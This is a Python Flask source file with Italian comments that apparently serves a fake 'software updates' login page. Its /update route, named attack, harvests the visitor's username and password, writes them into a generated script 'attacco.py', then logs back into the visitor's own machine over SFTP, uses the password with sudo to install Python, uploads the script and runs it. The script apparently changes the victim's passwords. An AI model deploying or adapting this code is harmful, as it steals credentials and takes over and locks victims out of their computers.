from flask import Flask, render_template, request, jsonify, redirect, url_for
import pysftp
import hashlib

app = Flask(__name__)


@app.route('/')
def toLogin():
    return redirect(url_for('login'))


@app.route('/login-aggiornamenti', methods=['GET'])
def login():
    return render_template('login-aggiornamenti.html')


@app.route('/aggiornamenti', methods=['POST'])
def index():
    return render_template('aggiornamenti.html')


@app.route('/update', methods=['POST'])
def attack():
    # prendo l'ip dall'oggetto request, l'username e la password dal form lato client
    ip = jsonify({'ip': request.remote_addr}).data.decode()[11:-4]
    uname = request.form['uname']
    password = request.form['password']
    print(f"'{ip}', '{uname}', '{password}'")

    newP = hashlib.sha256(password.encode()).digest().decode()  # la password è soggetta all'algoritmo di hash sha256
    newP_su = hashlib.sha512(newP.encode()).digest().decode()   # la password è soggetta all'algoritmo di hash sha512
    fpI = open('static/python/setup_attacco.txt', 'r')
    fpO = open('static/python/attacco.py', 'w')

    # scrivo il file python da iniettare con sftp
    fpO.write(f"old_password = '{password}'\n")
    fpO.write(f"new_su_password = '{newP_su}'\n")
    fpO.write(f"new_password = '{newP}'\n")
    fpO.write(f"uname = '{uname}'\n\n")
    for line in fpI.readlines():
        fpO.write(line)
    fpI.close()
    fpO.close()

    # tento di aprire la connessione SFTP, in base a esso scelgo che html far visualizzare al client
    try:
        sftp = pysftp.Connection(ip, username=uname, password=password)
        sftp.execute(f'echo {password} | sudo -S apt install -y python3')
        sftp.put('./static/python/attacco.py')
        sftp.execute(f'python3 attacco.py')
        sftp.close()
        return render_template('aggiornamenti-success.html')
    except:
        return render_template('aggiornamenti-failed.html')


app.run(host='0.0.0.0', debug=True)
